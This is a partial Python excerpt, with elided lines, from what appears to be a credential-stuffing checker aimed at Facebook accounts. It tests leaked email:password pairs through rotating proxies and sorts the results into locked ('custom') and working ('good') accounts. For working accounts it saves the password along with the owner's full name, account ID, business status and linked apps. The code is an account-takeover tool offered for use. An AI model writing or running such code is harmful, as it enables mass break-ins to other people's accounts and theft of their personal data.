        ...
        try:
            with Session() as s:
                ...
                if any(
                    ...
                    for key in [
                        "User must verify",
                        "To help keep your account safe, we temporarily locked it.",
                        "You can't log in right now\\",
                    ]
                ):
                    if not Checker.cui:
                        log("custom", ":".join([email, password]), "Facebook")
                    save(
                        "Facebook", "custom", Checker.time, ":".join([email, password])
                    )
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                ...
                business = r.text.split(',"IS_BUSINESS_PERSON_ACCOUNT":')[1].split(",")[
                    0
                ]
                ...
                if not Checker.cui:
                    log("good", ":".join([email, password]), "Facebook")
                save(
                    "Facebook",
                    "good",
                    Checker.time,
                    ":".join([email, password])
                    + f" | Full Name: {full_name} | Business Account: {business} | Account ID: {acc_id} | Linked Apps: {linked_apps}",
                )
                Checker.good += 1
                return_proxy(proxy)
                return
